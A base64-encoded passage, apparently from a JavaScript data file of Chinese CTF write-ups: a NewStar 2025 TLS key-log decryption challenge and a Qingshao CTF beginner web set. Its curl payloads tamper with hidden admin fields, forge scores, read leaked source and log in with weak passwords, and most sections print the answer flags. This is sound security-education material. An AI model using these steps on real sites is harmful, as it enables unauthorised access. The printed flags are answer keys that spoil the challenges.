CkpXHJcbiAgICBjb21wcmVzc2VkID0gemxpYi5jb21wcmVzcyhtc2cuZW5jb2RlKCkpXHJcbiAgICByZXR1cm4gaG1hYy5uZXcoc2VjcmV0LmVuY29kZSgpLCBjb21wcmVzc2VkLCBoYXNobGliLnNoYTI1NikuaGV4ZGlnZXN0KClcclxuXFxgXFxgXFxgXHJcblxyXG4jIyBcdTY1M0JcdTUxRkJcdTYwMURcdThERUZcclxuXHJcbjEuICoqXHU5NTdGXHU1RUE2XHU2MjY5XHU1QzU1XHU2NTNCXHU1MUZCKipcdUZGMUFcdTU3MjhcdTUzOUZcdTY3MDlcdTdCN0VcdTU0MERcdTU3RkFcdTc4NDBcdTRFMEFcdThGRkRcdTUyQTBcdTY1QjBcdTUzQzJcdTY1NzBcclxuMi4gKipcdTVCQzZcdTk0QTVcdTcyMDZcdTc4MzQqKlx1RkYxQVx1NzdFRFx1NUJDNlx1OTRBNSArIFx1NUI1N1x1NTE3OFx1NjUzQlx1NTFGQlxyXG4zLiAqKlx1N0YxNlx1NzgwMVx1NkRGN1x1NkRDNioqXHVGRjFBXHU1MjI5XHU3NTI4IFdBRiBcdTdGMTZcdTc4MDFcdTU5MDRcdTc0MDZcdTRFMERcdTRFMDBcdTgxRjRcclxuXHJcbiMjIFx1N0VDRlx1OUE4Q1xyXG5cclxuMS4gXHU1MTQ4XHU5QThDXHU4QkMxXHU2NzJDXHU1NzMwXHU3QjdFXHU1NDBEXHJcbjIuIFx1NTIyOVx1NzUyOFx1OTUxOVx1OEJFRlx1NEZFMVx1NjA2Rlx1NkNDNFx1OTczMlx1NEUyRFx1OTVGNFx1NzJCNlx1NjAwMVxyXG4zLiBcdTU5MUFcdTVDNDJcdTdGMTZcdTc4MDFcdTg5ODFcdTkwMTBcdTVDNDJcdTUyNjVcdTc5QkJcclxuYFxyXG4gIH0sXHJcblxyXG4gIG5vdGFsbG1pbGs6IHtcclxuICAgIHRpdGxlOiAnTmV3U3RhciAyMDI1IFx1MjAxNCBcdTRFMERcdTY2MkZcdTYyNDBcdTY3MDlcdTcyNUJcdTU5NzZcdTkwRkRcdTUzRUJfX18nLFxyXG4gICAgc3VidGl0bGU6ICdUTFMgXHU2RDQxXHU5MUNGXHU4OUUzXHU1QkM2ICsgUVJcdTc4MDFcdTYzRDBcdTUzRDYnLFxyXG4gICAgaWNvbjogJ0tleScsXHJcbiAgICBjb2xvcjogJ2FtYmVyJyxcclxuICAgIGNvbnRlbnQ6IGBcclxuIyBOZXdTdGFyIENURiAyMDI1IEV4dHJhcyBcdTIwMTQgXHU0RTBEXHU2NjJGXHU2MjQwXHU2NzA5XHU3MjVCXHU1OTc2XHU5MEZEXHU1M0VCX19fXHJcblxyXG4qKlx1N0M3Qlx1NTc4QioqOiBNaXNjIC8gXHU2RDQxXHU5MUNGXHU1MjA2XHU2NzkwIHwgKipcdTk2QkVcdTVFQTYqKjogTWVkaXVtIHwgKipcdTVFNzNcdTUzRjAqKjogTmV3U3RhciBDVEZcclxuXHJcbiMjIFx1ODAwM1x1NzBCOVxyXG5cclxuVExTIFx1NkQ0MVx1OTFDRlx1ODlFM1x1NUJDNlx1MzAwMVNTTCBrZXkgbG9nXHUzMDAxV2lyZXNoYXJrIFx1OTE0RFx1N0Y2RVx1MzAwMVFSXHU3ODAxXHJcblxyXG4jIyBcdTg5RTNcdTk4OThcdTZENDFcdTdBMEJcclxuXHJcbjEuICoqXHU1QkExXHU5ODk4KipcdUZGMUFcdTk4OThcdTc2RUVcdTU0MERcdTMwMENcdTRFMERcdTY2MkZcdTYyNDBcdTY3MDlcdTcyNUJcdTU5NzZcdTkwRkRcdTUzRUJfX19cdTMwMERcdTY2OTdcdTc5M0EgVExTXHVGRjA4XHU3Mjc5XHU0RUQxXHU4MkNGIFx1MjE5MiBUTFNcdUZGMDlcclxuMi4gKipcdTYyN0Uga2V5IGxvZyoqXHVGRjFBXHU1NzI4IEhUVFAgXHU2RDQxXHU5MUNGXHU0RTJEXHU3QjVCXHU2N0U1XHVGRjBDXHU2MjdFXHU1MjMwXHU1MzNBXHU1MjJCXHU0RThFXHU1NjZBXHU1OEYwXHU2NTg3XHU0RUY2XHU3Njg0IFNTTCBrZXkgbG9nXHJcbjMuICoqV2lyZXNoYXJrIFx1ODlFM1x1NUJDNioqXHVGRjFBXHU5OTk2XHU5MDA5XHU5ODc5IFx1MjE5MiBQcm90b2NvbHMgXHUyMTkyIFRMUyBcdTIxOTIgXHU1MkEwXHU4RjdEIChQcmUpLU1hc3Rlci1TZWNyZXQgbG9nXHJcbjQuICoqXHU4RkM3XHU2RUU0IEhUVFAqKlx1RkYxQVx1ODlFM1x1NUJDNlx1NTQwRVx1OTFDRFx1NjVCMFx1OEZDN1x1NkVFNCBodHRwXHVGRjBDXHU1OTI3XHU5MUNGIFBPU1QgXHU0RTJEXHU1NzI4XHU3QjJDIDUwIFx1NEUyQVx1NkQ0MVx1NjI3RVx1NTIzMCBiYXNlNjQgXHU1NkZFXHU3MjQ3XHJcbjUuICoqQ3liZXJDaGVmKipcdUZGMUFGcm9tIEJhc2U2NCBcdTIxOTIgXHU0RTBCXHU4RjdEIFBORyBcdTIxOTIgXHU2MjZCXHU3ODAxXHU1Rjk3IGZsYWdcclxuXHJcbiMjIEZsYWdcclxuXHJcblxcYFxcYFxcYFxyXG5mbGFne1cwd19Zb3VfcjNhbDF5X2tuT1dfVEw1UXJDb2RlfVxyXG5cXGBcXGBcXGBcclxuXHJcbj4gXHU1MzlGXHU1OUNCXHU2MjZCXHU3ODAxXHU3RUQzXHU2NzlDXHU1MzA1XHU1NDJCIFxcYCZcXGBcdUZGMDhUTDUmUXJDb2RlXHVGRjA5XHVGRjBDXHU5ODk4XHU3NkVFXHU2M0QwXHU3OTNBXHU2M0QwXHU0RUE0XHU2NUY2XHU1M0JCXHU2Mzg5ICYgXHU3QjI2XHU1M0Y3XHUzMDAyXHJcblxyXG4jIyBcdTUxNzNcdTk1MkVcdTY1NTlcdThCQURcclxuXHJcbi0gXHU5ODk4XHU3NkVFXHU1NDBEXHU1RjgwXHU1RjgwXHU1QzMxXHU2NjJGXHU3QjJDXHU0RTAwXHU0RTJBIGhpbnRcdUZGMDhUTFMgXHU3RjI5XHU1MTk5XHVGRjA5XHJcbi0gQ1RGIFx1NkQ0MVx1OTFDRlx1OTg5OFx1NEUyRFx1NTkyN1x1OTFDRlx1NTY2QVx1NThGMFx1NjYyRlx1NUUzOFx1NjAwMVx1RkYwQ1x1ODAxMFx1NUZDM1x1NUJBMVx1OEJBMVxyXG4tIFNTTCBrZXkgbG9nIFx1NzY4NCBcXFxcXFxcXG4gXHU5NzAwXHU4OTgxXHU4RjZDXHU2MjEwXHU3NzFGXHU1QjlFXHU2MzYyXHU4ODRDXHU3QjI2XHU2MjREXHU4MEZEXHU4OEFCIFdpcmVzaGFyayBcdThCQzZcdTUyMkJcclxuLSBDeWJlckNoZWYgRnJvbSBCYXNlNjQgXHU1M0VGXHU0RUU1XHU3NkY0XHU2M0E1XHU1QkZDXHU1MUZBXHU0RUZCXHU2MTBGXHU0RThDXHU4RkRCXHU1MjM2XHU2NTg3XHU0RUY2XHJcbmBcclxuICB9LFxyXG5cclxuICBcInFpbmdjZW4td2ViLTIwMjYtMDYtMTBcIjoge1xyXG4gICAgdGl0bGU6IFwiXHU5NzUyXHU1QzkxIENURiBXZWIgXHU1MTY1XHU5NUU4IFdyaXRlVXBcIixcclxuICAgIHN1YnRpdGxlOiBcIjIwMjYtMDYtMTAgfCAxNy8yMCBcdTk4OThcdTg5RTNcdTUxRkFcIixcclxuICAgIGNvbnRlbnQ6IGBcclxuIyBcdTk3NTJcdTVDOTEgQ1RGIFdlYiBcdTUxNjVcdTk1RTggV3JpdGVVcFxyXG5cclxuKipcdTY1RTVcdTY3MUYqKjogMjAyNi0wNi0xMFxyXG4qKlx1NUU3M1x1NTNGMCoqOiBcdTk3NTJcdTVDOTEgQ1RGIChjdGYucWluZ2Nlbi5uZXQpXHJcbioqXHU2MjE4XHU3RUU5Kio6IDE3LzIwIFx1OTg5OFx1ODlFM1x1NTFGQVx1RkYwQzE3IFx1NEUyQSBmbGFnc1xyXG5cclxuLS0tXHJcblxyXG4jIyBcdUQ4M0RcdURDQ0IgXHU3NkVFXHU1RjU1XHJcblxyXG4xLiBbYmFzaWMgKDE3NykgLSBIVE1MIFx1NkNFOFx1OTFDQVx1NkNDNFx1OTczMl0oI2Jhc2ljLTE3NylcclxuMi4gW2Jhc2ljXzEgKDE3OCkgLSBCYXNlNjQgXHU4OUUzXHU3ODAxXSgjYmFzaWNfMS0xNzgpXHJcbjMuIFtiYXNpY18yICgxNzkpIC0gXHU5NjkwXHU4NUNGXHU1QjU3XHU2QkI1XHU0RkVFXHU2NTM5XSgjYmFzaWNfMi0xNzkpXHJcbjQuIFtiYXNpY180ICgxODEpIC0gQVNDSUkgXHU2NTcwXHU3RUM0XHU4OUUzXHU3ODAxXSgjYmFzaWNfNC0xODEpXHJcbjUuIFtiYXNpY181ICgxODIpIC0gXHU1MkEwXHU1QkM2IFBheWxvYWQgXHU2Nzg0XHU5MDIwXSgjYmFzaWNfNS0xODIpXHJcbjYuIFtiYXNpY182ICgxODMpIC0gXHU1NENEXHU1RTk0XHU1OTM0XHU2Q0M0XHU5NzMyXSgjYmFzaWNfNi0xODMpXHJcbjcuIFtiYXNpY184ICgxODYpIC0gLnBocHMgXHU2RTkwXHU3ODAxXHU2Q0M0XHU5NzMyXSgjYmFzaWNfOC0xODYpXHJcbjguIFtiYXNpY185ICgxODcpIC0gcm9ib3RzLnR4dCArIFx1NTM0MVx1NTE2RFx1OEZEQlx1NTIzNl0oI2Jhc2ljXzktMTg3KVxyXG45LiBbYmFzaWNfMTMgKDE5MSkgLSBcdTVGMzFcdTVCQzZcdTc4MDFcdTcyMDZcdTc4MzRdKCNiYXNpY18xMy0xOTEpXHJcbjEwLiBbYmFzaWNfMTQgKDE5MikgLSBcdTY1ODdcdTRFRjZcdTYzQ0ZcdThGRjBcdTdCMjZcdTZDQzRcdTk3MzJdKCNiYXNpY18xNC0xOTIpXHJcbjExLiBbZXpyZXF1ZXN0ICgxODQpIC0gXHU2REY3XHU1NDA4XHU4QkY3XHU2QzQyXHU2NUI5XHU2Q0Q1XSgjZXpyZXF1ZXN0LTE4NClcclxuMTIuIFtlenJlcXVlc3RfMSAoMTg1KSAtIFx1OEJGN1x1NkM0Mlx1NTkzNFx1NEYyQVx1OTAyMF0oI2V6cmVxdWVzdF8xLTE4NSlcclxuMTMuIFtlenBocCAoMjAxKSAtIFBIUCBcdTVGMzFcdTdDN0JcdTU3OEJcdTdFRDVcdThGQzddKCNlenBocC0yMDEpXHJcbjE0LiBbZXpwaHBfMSAoMjAyKSAtIGFycmF5X3NlYXJjaCBcdTVGMzFcdTdDN0JcdTU3OEJdKCNlenBocF8xLTIwMilcclxuMTUuIFtlenBocF8yICgyMDMpIC0gXHU1RDRDXHU1OTU3XHU1RjMxXHU3QzdCXHU1NzhCXHU3RUQ1XHU4RkM3XSgjZXpwaHBfMi0yMDMpXHJcbjE2LiBbd2ViX3Rlc3RfMiAoNjM1KSAtIFx1NzlEMVx1NUI2Nlx1OEJBMVx1NjU3MFx1NkNENVx1N0VENVx1OEZDN10oI3dlYl90ZXN0XzItNjM1KVxyXG4xNy4gW1x1NjI4MFx1NURFN1x1NjAzQlx1N0VEM10oI1x1NjI4MFx1NURFN1x1NjAzQlx1N0VEMylcclxuXHJcbi0tLVxyXG5cclxuIyMgYmFzaWMgKDE3NykgLSBIVE1MIFx1NkNFOFx1OTFDQVx1NkNDNFx1OTczMlxyXG5cclxuKipcdTk4OThcdTc2RUVcdTYzQ0ZcdThGRjAqKjogXCJcdTRFMDdcdTUzNzdcdTY1ODdcdTdBRTBcdUZGMENcdTRFMERcdThGQzdcdTVGMTVcdThERUZcdTRFNEJcdTc3RjNcdUZGMUJcdTc3MUZcdTc2RjhcdTRFMERcdTU3MjhcdTVCNTdcdTkxQ0NcdTg4NENcdTk1RjRcdUZGMENcdTgwMENcdTU3MjhcdTdFQjhcdTk3NjJcdTRFNEJcdTRFMEJcdTMwMDJcdTU1ODRcdTg5QzJcdTgwMDVcdUZGMENcdTgxRUFcdTY3MDlcdTYxNjdcdTc3M0NcdThCQzZcdTczRTBcdTMwMDJGMTJcdTRFMDBcdTdBQTVcdUZGMENcdTVGNTNcdTY3MDlcdTYyNDBcdTgzQjdcdTMwMDJcIlxyXG5cclxuKipcdTg5RTNcdTk4OThcdTYwMURcdThERUYqKjogXHU2N0U1XHU3NzBCIEhUTUwgXHU2RTkwXHU3ODAxXHVGRjBDXHU1QkZCXHU2MjdFXHU2Q0U4XHU5MUNBXHU0RTJEXHU3Njg0XHU5NjkwXHU4NUNGXHU0RkUxXHU2MDZGXHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIC1zIFwiaHR0cDovL3RhcmdldC9cIiB8IGdyZXAgXCI8IS0tXCJcclxuXFxgXFxgXFxgXHJcblxyXG4qKkZsYWcqKjogXFxgZmxhZ3s2ZTVlY2I2Yy1kZTMwLTQ5ZGQtYjVjZS02OTE2YTIyMmVmOGR9XFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIGJhc2ljXzEgKDE3OCkgLSBCYXNlNjQgXHU4OUUzXHU3ODAxXHJcblxyXG4qKlx1OTg5OFx1NzZFRVx1NjNDRlx1OEZGMCoqOiBcIlx1NTlEMFx1NTlEMFx1OEJGNFx1NEUwRFx1OEJCOFx1NTA3N1x1NzcwQlx1RkYwQ1x1NEY0Nlx1ODlDNFx1NzdFOVx1NTQxMVx1Njc2NVx1NjYyRlx1NzUyOFx1Njc2NVx1NzgzNFx1NzY4NFx1MzAwMlwiXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBcdTU3MjggSFRNTCBcdTZDRThcdTkxQ0FcdTRFMkRcdTUzRDFcdTczQjAgQmFzZTY0IFx1N0YxNlx1NzgwMVx1NzY4NFx1NUI1N1x1N0IyNlx1NEUzMlx1MzAwMlxyXG5cclxuKipQYXlsb2FkKio6XHJcblxcYFxcYFxcYGJhc2hcclxuZWNobyAnWm14aFozdGtNR05rTm1FNVpDMHpPVEF5TFRRd04yUXRPRGs0WXkweU9UTTFORGRsTkRaa09EbDknIHwgYmFzZTY0IC1kXHJcblxcYFxcYFxcYFxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7ZDBjZDZhOWQtMzkwMi00MDdkLTg5OGMtMjkzNTQ3ZTQ2ZDg5fVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBiYXNpY18yICgxNzkpIC0gXHU5NjkwXHU4NUNGXHU1QjU3XHU2QkI1XHU0RkVFXHU2NTM5XHJcblxyXG4qKlx1OTg5OFx1NzZFRVx1NjNDRlx1OEZGMCoqOiBcIlx1NjVFMlx1NjYyRlx1NTI0RFx1N0FFRlx1NjI0MFx1OEJCRVx1RkYwQ1x1ODFFQVx1NTNFRlx1NTI0RFx1N0FFRlx1NjI0MFx1NjUzOVx1RkYxQVx1NjM4MFx1NUUxOFx1N0FBNVx1NkU5MFx1RkYwQ1x1NjUzOVx1OTZGNlx1NEY1Q1x1NThGOVx1RkYwQ1x1NTgwMlx1OTVFOFx1ODFFQVx1NTQyRlx1MzAwMlwiXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBcdTg4NjhcdTUzNTVcdTRFMkRcdTY3MDlcdTRFMDBcdTRFMkFcdTk2OTBcdTg1Q0ZcdTVCNTdcdTZCQjUgXFxgaXNfYWRtaW5cXGBcdUZGMENcdTUwM0NcdTRFM0EgXFxgMFxcYFx1RkYwQ1x1OTcwMFx1ODk4MVx1NjUzOVx1NEUzQSBcXGAxXFxgXHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIC1YIFBPU1QgXCJodHRwOi8vdGFyZ2V0L2luZGV4LnBocFwiIC1kIFwiaXNfYWRtaW49MSZuaWNrbmFtZT10ZXN0JmNvbnRhY3Q9dGVzdEB0ZXN0LmNvbSZjb250ZW50PXRlc3RcIlxyXG5cXGBcXGBcXGBcclxuXHJcbioqRmxhZyoqOiBcXGBmbGFne2NkYzY0ODBhLTZjYjctNDIyYS1iZjZhLTIyNDNiNTk2NDcyNH1cXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgYmFzaWNfNCAoMTgxKSAtIEFTQ0lJIFx1NjU3MFx1N0VDNFx1ODlFM1x1NzgwMVxyXG5cclxuKipcdTk4OThcdTc2RUVcdTYzQ0ZcdThGRjAqKjogXCJcdTY3MzFcdTk1RThcdTY3MDlcdTk1MDFcdUZGMENcdTk3NUVcdTkwODBcdTgzQUJcdTUxNjVcdTMwMDJcdTRFMTZcdTRFQkFcdTUzRUFcdTg5QzFcdTRFNzFcdTY1NzBcdTk0RkFcdTk2NDhcdUZGMENcdTRFMERcdThCQzZcdTUxNzZcdTk1RjRcdTg1Q0ZcdTczRTBcdTMwMDJcdTVCNTdcdTdCMjZcdTRFMERcdThCRURcdUZGMENcdTc4MDFcdTRFMkRcdTY3MDlcdTc4MDFcdUZGMUJcdTg5RTNcdTc4MDFcdTg5QzFcdTc3MUZcdUZGMENcdTgxRUFcdTVGOTdcdTkwMUFcdTUxNzNcdTRFNEJcdTk0QTVcdTMwMDJcIlxyXG5cclxuKipcdTg5RTNcdTk4OThcdTYwMURcdThERUYqKjogSmF2YVNjcmlwdCBcdTRFMkRcdTY3MDlcdTRFMDlcdTRFMkFcdTY1NzBcdTdFQzRcdTVCNThcdTUwQTggQVNDSUkgXHU1MDNDXHVGRjBDXHU5NzAwXHU4OTgxXHU4OUUzXHU3ODAxXHU4M0I3XHU1M0Q2XHU5MDgwXHU4QkY3XHU3ODAxXHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgcHl0aG9uXHJcbl8wID0gWzgxLCA2NywgNjcsIDg0LCA3MCwgOTUsIDg2LCA3MywgODAsIDk1LCA1MCwgNDgsIDUwLCA1NF1cclxuaW52aXRlX2NvZGUgPSAnJy5qb2luKGNocihjKSBmb3IgYyBpbiBfMCkgICMgUUNDVEZfVklQXzIwMjZcclxuXHJcbiMgXHU2M0QwXHU0RUE0XHU5MDgwXHU4QkY3XHU3ODAxXHJcbmN1cmwgLVggUE9TVCBcImh0dHA6Ly90YXJnZXQvZmxhZ1wiIC1IIFwiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uXCIgLWQgJ3tcImNvZGVcIjogXCJRQ0NURl9WSVBfMjAyNlwifSdcclxuXFxgXFxgXFxgXHJcblxyXG4qKkZsYWcqKjogXFxgZmxhZ3tjZWZjOWJhZS02MWI2LTQwNTgtOGQ1MC0yNTE2Njc4YWYwMmZ9XFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIGJhc2ljXzUgKDE4MikgLSBcdTUyQTBcdTVCQzYgUGF5bG9hZCBcdTY3ODRcdTkwMjBcclxuXHJcbioqXHU5ODk4XHU3NkVFXHU2M0NGXHU4RkYwKio6IFwiXHU3OUVGXHU1MjA2XHU1OTgyXHU1QzcxXHVGRjBDXHU1MzQzXHU1MjA2XHU1M0VGXHU1MTUxXHU1MTc2XHU4RDRGXHUzMDAyXHU1MkU0XHU4MDA1XHU2MjRCXHU3MEI5XHU3NjdFXHU1NkRFXHVGRjBDXHU2NjdBXHU4MDA1XHU3RUM2XHU4QkZCSlNcdTMwMDJcdTk4ODZcdTUxNzZcdTc3MUZcdTYxMEZcdUZGMENcdTUzNDNcdTUyMDZcdTY2MTNcdTVGOTdcdTMwMDJcIlxyXG5cclxuKipcdTg5RTNcdTk4OThcdTYwMURcdThERUYqKjogXHU5NzAwXHU4OTgxXHU3QjU0XHU1QkY5IDEwMDAgXHU5MDUzXHU4QkExXHU3Qjk3XHU5ODk4XHVGRjBDXHU0RjQ2XHU1M0VGXHU0RUU1XHU2Nzg0XHU5MDIwXHU1MkEwXHU1QkM2IHBheWxvYWQgXHU4REYzXHU4RkM3XHU3QjU0XHU5ODk4XHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgcHl0aG9uXHJcbmltcG9ydCBiYXNlNjQsIGpzb25cclxuXHJcbnBheWxvYWQgPSB7J3Njb3JlJzogMTAwMH1cclxuZW5jcnlwdGVkID0gYmFzZTY0LmI2NGVuY29kZShqc29uLmR1bXBzKHBheWxvYWQpLmVuY29kZSgpKS5kZWNvZGUoKVxyXG5cclxuIyBcdTYzRDBcdTRFQTRcclxuY3VybCAtWCBQT1NUIFwiaHR0cDovL3RhcmdldC9jbGFpbVwiIC1IIFwiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uXCIgLWQgJ3tcImRhdGFcIjogXCInJGVuY3J5cHRlZCdcIn0nXHJcblxyXG4jIFx1ODlFM1x1NzgwMVx1NTRDRFx1NUU5NFxyXG5yZXNwb25zZV9lbmNyeXB0ZWQgPSBcImV5Sm1iR0ZuSWpvZ0ltWnNZV2Q3T0RnMU16TmtOVEl0WW1NM05DMDBaRFl3TFdFME5Ua3ROVGszT0RreVpqSXdNRE13ZlNKOVwiXHJcbmZsYWcgPSBiYXNlNjQuYjY0ZGVjb2RlKHJlc3BvbnNlX2VuY3J5cHRlZCkuZGVjb2RlKClcclxuXFxgXFxgXFxgXHJcblxyXG4qKkZsYWcqKjogXFxgZmxhZ3s4ODUzM2Q1Mi1iYzc0LTRkNjAtYTQ1OS01OTc4OTJmMjAwMzB9XFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIGJhc2ljXzYgKDE4MykgLSBcdTU0Q0RcdTVFOTRcdTU5MzRcdTZDQzRcdTk3MzJcclxuXHJcbioqXHU5ODk4XHU3NkVFXHU2M0NGXHU4RkYwKio6IFwiXHU3NzNDXHU0RTJEXHU2MjQwXHU4OUMxXHVGRjBDXHU0RTBEXHU4RkM3XHU0RTAwXHU3RUI4XHU1MTZDXHU2NTg3XHVGRjFCXHU3NzFGXHU3QUUwXHU0RTBEXHU1NzI4XHU3RUI4XHU5NzYyXHVGRjBDXHU4MDBDXHU1NzI4XHU3RUI4XHU1OTE2XHUzMDAyXHU3RUM2XHU3QTc2XHU2NzY1XHU4REVGXHVGRjBDXHU4M0FCXHU2QjYyXHU2QjY1XHU0RThFXHU4ODY4XHU4QzYxXHUyMDE0XHUyMDE0XHU1RTM3XHU1RTU1XHU0RTRCXHU1NDBFXHVGRjBDXHU4MUVBXHU2NzA5XHU2RDFFXHU1OTI5XHUzMDAyYnBcdTYyOTNcdTUzMDVcdUZGMENcdTczODRcdTY3M0FcdTgxRUFcdTczQjBcdTMwMDJcIlxyXG5cclxuKipcdTg5RTNcdTk4OThcdTYwMURcdThERUYqKjogRmxhZyBcdTk2OTBcdTg1Q0ZcdTU3MjggSFRUUCBcdTU0Q0RcdTVFOTRcdTU5MzQgXFxgWC1GbGFnXFxgIFx1NEUyRFx1MzAwMlxyXG5cclxuKipQYXlsb2FkKio6XHJcblxcYFxcYFxcYGJhc2hcclxuY3VybCAtcyAtSSBcImh0dHA6Ly90YXJnZXQvXCIgfCBncmVwIFwiWC1GbGFnXCJcclxuXFxgXFxgXFxgXHJcblxyXG4qKkZsYWcqKjogXFxgZmxhZ3tiMzEzODkxYS0zZTRmLTQ3NjMtYjMyMS04NTc4ZTliNDk1ZmJ9XFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIGJhc2ljXzggKDE4NikgLSAucGhwcyBcdTZFOTBcdTc4MDFcdTZDQzRcdTk3MzJcclxuXHJcbioqXHU5ODk4XHU3NkVFXHU2M0NGXHU4RkYwKio6IFwiXHU5NjQ0XHVGRjFBXHU1RjAwXHU1M0QxXHU2NTg3XHU2ODYzXHU2QjYzXHU1NzI4XHU2NTc0XHU3NDA2XHU0RTJEXHVGRjBDXHU4QkY3XHU3NkY4XHU1MTczXHU3Njg0XHU2MjgwXHU2NzJGXHU0RUJBXHU1NDU4XHU4QkJGXHU5NUVFXHU3RjUxXHU3QUQ5XHU3Njg0XHU2RTkwXHU0RUUzXHU3ODAxXHU2NTg3XHU0RUY2XHU2NzY1XHU4M0I3XHU1M0Q2XHU3NkY4XHU1MTczXHU0RkUxXHU2MDZGXHUzMDAyXCJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IFxcYC5waHBzXFxgIFx1NjU4N1x1NEVGNlx1NEYxQVx1NkNDNFx1OTczMiBQSFAgXHU2RTkwXHU3ODAxXHVGRjBDXHU0RUNFXHU0RTJEXHU2MjdFXHU1MjMwXHU1QkM2XHU3ODAxXHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgYmFzaFxyXG4jIFx1ODNCN1x1NTNENlx1NkU5MFx1NzgwMVxyXG5jdXJsIC1zIFwiaHR0cDovL3RhcmdldC9pbmRleC5waHBzXCJcclxuXHJcbiMgXHU1M0QxXHU3M0IwXHU1QkM2XHU3ODAxOiBRQ3lZZFNcclxuY3VybCAtcyBcImh0dHA6Ly90YXJnZXQvaW5kZXgucGhwP2E9UUN5WWRTXCJcclxuXFxgXFxgXFxgXHJcblxyXG4qKkZsYWcqKjogXFxgZmxhZ3szMTBlNWI4NS00YjY5LTQwMDktYjlkMy03OGFkYTVmMDFmZDV9XFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIGJhc2ljXzkgKDE4NykgLSByb2JvdHMudHh0ICsgXHU1MzQxXHU1MTZEXHU4RkRCXHU1MjM2XHJcblxyXG4qKlx1OTg5OFx1NzZFRVx1NjNDRlx1OEZGMCoqOiBcdTY4QzBcdTY3RTUgcm9ib3RzLnR4dCBcdTY1ODdcdTRFRjZcdTMwMDJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IHJvYm90cy50eHQgXHU2Q0M0XHU5NzMyXHU0RTg2XHU5NjkwXHU4NUNGXHU2NTg3XHU0RUY2XHU4REVGXHU1Rjg0XHVGRjBDXHU2NTg3XHU0RUY2XHU1MTg1XHU1QkI5XHU2NjJGXHU1MzQxXHU1MTZEXHU4RkRCXHU1MjM2XHU3RjE2XHU3ODAxXHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgYmFzaFxyXG4jIFx1NjhDMFx1NjdFNSByb2JvdHMudHh0XHJcbmN1cmwgLXMgXCJodHRwOi8vdGFyZ2V0L3JvYm90cy50eHRcIlxyXG4jIFVzZXItYWdlbnQ6ICpcclxuIyBEaXNhbGxvdzogL3FjcS5waHBcclxuXHJcbiMgXHU4QkJGXHU5NUVFXHU2Q0M0XHU5NzMyXHU3Njg0XHU2NTg3XHU0RUY2XHJcbmN1cmwgLXMgXCJodHRwOi8vdGFyZ2V0L3FjcS5waHBcIlxyXG4jIDY2NmM2MTY3N2IzNjM2MzE2MTYxNjM2MTYyMmQ2MjY2NjQ2MTJkMzQzNzMwNjEyZDYyMzMzMDYyMmQzMDM0MzIzNjYzMzgzNTY0MzM2MzYzMzQ3ZFxyXG5cclxuIyBcdTUzNDFcdTUxNkRcdThGREJcdTUyMzZcdTg5RTNcdTc4MDFcclxucHl0aG9uMyAtYyBcInByaW50KGJ5dGVzLmZyb21oZXgoJzY2NmM2MTY3N2IzNjM2MzE2MTYxNjM2MTYyMmQ2MjY2NjQ2MTJkMzQzNzMwNjEyZDYyMzMzMDYyMmQzMDM0MzIzNjYzMzgzNTY0MzM2MzYzMzQ3ZCcpLmRlY29kZSgpKVwiXHJcblxcYFxcYFxcYFxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7NjYxYWFjYWItYmZkYS00NzBhLWIzMGItMDQyNmM4NWQzY2M0fVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBiYXNpY18xMyAoMTkxKSAtIFx1NUYzMVx1NUJDNlx1NzgwMVx1NzIwNlx1NzgzNFxyXG5cclxuKipcdTk4OThcdTc2RUVcdTYzQ0ZcdThGRjAqKjogXHU3NjdCXHU1RjU1XHU5ODc1XHU5NzYyXHVGRjBDXHU3NTI4XHU2MjM3XHU1NDBEXHU1REYyXHU3N0U1XHU0RTNBIFxcYGFkbWluXFxgXHUzMDAyXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBcdTRGN0ZcdTc1MjhcdTVFMzhcdTg5QzFcdTVGMzFcdTVCQzZcdTc4MDFcdThGREJcdTg4NENcdTcyMDZcdTc4MzRcdTMwMDJcclxuXHJcbioqUGF5bG9hZCoqOlxyXG5cXGBcXGBcXGBiYXNoXHJcbmN1cmwgLVggUE9TVCBcImh0dHA6Ly90YXJnZXQvXCIgLWQgXCJ1c2VybmFtZT1hZG1pbiZwYXNzd29yZD1hZG1pbjEyM1wiXHJcblxcYFxcYFxcYFxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7NzQ0ZjUwNTAtNjUxOC00OWUyLWJkMjItYTE1NDFiMjg1OTM4fVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBiYXNpY18xNCAoMTkyKSAtIFx1NjU4N1x1NEVGNlx1NjNDRlx1OEZGMFx1N0IyNlx1NkNDNFx1OTczMlxyXG5cclxuKipcdTk4OThcdTc2RUVcdTYzQ0ZcdThGRjAqKjogUEhQIFx1NkU5MFx1NzgwMVx1NjYzRVx1NzkzQSBcXGByZWFkZmlsZSgpXFxgIFx1NTFGRFx1NjU3MFx1RkYwQ1x1NjU4N1x1NEVGNlx1NTQwRFx1OTU3Rlx1NUVBNlx1OTY1MFx1NTIzNiA8IDE3XHUz